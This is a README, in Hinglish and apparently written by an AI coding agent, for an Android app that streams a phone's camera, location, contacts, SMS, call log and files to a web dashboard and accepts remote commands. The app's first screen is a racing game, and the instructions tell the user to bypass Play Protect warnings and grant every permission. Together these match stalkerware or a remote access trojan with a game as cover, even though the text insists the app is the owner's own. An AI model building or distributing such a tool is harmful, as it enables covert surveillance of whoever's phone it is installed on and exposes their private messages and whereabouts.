# MyPersonalAccess — Android Companion App (APK)

Apne phone ka **complete remote access** apni website se. Ye app tumhare phone par
install hoti hai, tum permissions Allow karte ho, aur phir website (dashboard)
se phone ko live dekh + control kar sakte ho.

**Ye tumhari apni app hai** — koi teesri company nahi, koi virus nahi. Code tumhara
apna hai, data sirf tumhare apne Supabase project par jata hai, aur kuch bhi
save nahi hota.

## 🏎️ Racing Game — Turbo Race

App kholte hi sab se pehle **Turbo Race** card nazar aayega — simple racing game,
bilkul free, koi internet nahi chahiye:

- 3-lane road, gaadi drag karo ya ◀ ▶ dabao
- Traffic se bacho, coins looto (+50 points)
- Speed waqt ke saath barhti hai, best score phone par save hota hai
- Coin par beep, crash par buzz (ToneGenerator, koi file nahi)

## Kya-kya milta hai (website dashboard par)

- 📷 **Live camera** — har ~2.5 second mein photo, front/back flip, "Photo Now"
- 📍 **Live location** — GPS + Google Maps link
- 📞 **Phone number** — SIM par save ho to dikhega (aksar SIM par save nahi hota — ye normal hai)
- 📇 **Contacts** — pehle 50 + total count
- 💬 **Recent SMS** — last 10 inbox messages
- 📞 **Call log** — last 10 calls (incoming/outgoing/missed, duration)
- 🖼️ **Files** — recent 20 photos/videos (naam + size)
- 🔋 **Battery, model, Android version, screen, network**
- 🔔 **Remote commands** — Phone Bajao (ring + vibrate), Camera Flip, Data Refresh, Sab Band Karo

## Kya NAHI milta (sach baat)

- **Screen touch control nahi hai** — website se phone ki screen par tap/swipe karna
  alag cheez hai (Accessibility Service chahiye). Agar wo chahiye to next step mein
  add ho sakta hai — bata dena.
- **Phone number aksar nahi milta** — number SIM par save ho to hi dikhta hai;
  aksar carriers number SIM par save nahi karte. Ye Android ki limit hai, app ki nahi.
- Camera sirf tab chalega jab foreground service ki notification dikh rahi ho
  (Android 12+ ka rule hai) — notification hamesha dikhegi, kuch chhupa hua nahi.

## ☁️ GitHub Actions se APK banao (bina PC ke — sirf mobile se)

1. Ye source GitHub repo `mypersonalaccess` ke `android/` folder mein hai (Muse push karta hai).
2. GitHub par repo kholo → **Actions** tab → latest **"Build Android APK"** run.
3. Run khatam ho (✅ green) to neeche **Artifacts** mein **mypersonalaccess-apk** milega — download karo, unzip karo, `app-debug.apk` install karo.
4. Dobara build chahiye to repo mein koi bhi push karo, ya Actions mein **Run workflow** dabao.

## APK banana (Android Studio)

Ye source code hai — APK Android Studio mein banta hai (sandbox mein Gradle
nahi chal sakta, is liye yahan compile-verify nahi hua; code standard APIs
par likha hai).

1. **Android Studio** install karo (latest, developer.android.com/studio).
2. **File → Open** → ye `mypersonalaccess-android` folder kholo.
3. **Sync** hone do — Gradle + libraries download hongi (internet chahiye, thoda time lagega).
4. Phone connect karo (USB Debugging ON) **ya** menu: **Build → Build App Bundle(s) / APK(s) → Build APK(s)**.
5. APK milega: `app/build/outputs/apk/debug/app-debug.apk` — phone mein copy kar ke install karo.
6. Install karte waqt **Play Protect** warning aaye to "Install anyway" dabao (ye tumhari
   apni app hai, Play Store ki nahi — is liye warning aati hai).
7. App kholo → Room Code daalo → **"Sab Allow Karo"** dabao (har permission par Allow) →
   **Sharing Start Karo** dabao.
8. Website par `/dashboard` kholo, **wahi Room Code** daalo — sab kuch live dikhega.

## Kaise kaam karta hai (technical)

- Relay: Supabase Realtime (tumhara GamesHub project) — channel `remote-<CODE>`.
- App raw WebSocket (OkHttp) se Phoenix protocol bolti hai: `phx_join` JSON,
  broadcasts JSON, heartbeat har 30s. Broadcasts receive hote waqt **binary
  frames** aate hain — unka JSON payload frame ke end mein hota hai, wahan se
  parse hota hai (ye live test karke verify kiya gaya hai).
- Camera: CameraX (headless, foreground service ke andar) — frame 480px, JPEG 55.
- Location: Fused Location Provider, har 10s.
- Data: ContentResolver (Contacts / SMS / CallLog / MediaStore), TelephonyManager.
- Room Code hi lock hai — random code use karo, kisi se share na karo.
- Sharing band karte hi socket, camera, location — sab ruk jata hai.

## Files

- `app/src/main/java/com/mypersonalaccess/app/MainActivity.kt` — UI (Compose): setup, permissions, status, last frame, log + game card
- `app/src/main/java/com/mypersonalaccess/app/RacingGame.kt` — Turbo Race game (Compose Canvas, drag + button steering, coins, traffic, best score)
- `app/src/main/java/com/mypersonalaccess/app/RemoteService.kt` — foreground service: connection, camera, location, commands, notification
- `app/src/main/java/com/mypersonalaccess/app/SupabaseRealtime.kt` — raw WebSocket Phoenix client
- `app/src/main/java/com/mypersonalaccess/app/CameraHelper.kt` — CameraX headless capture
- `app/src/main/java/com/mypersonalaccess/app/DataCollectors.kt` — number, contacts, SMS, calls, files, device info
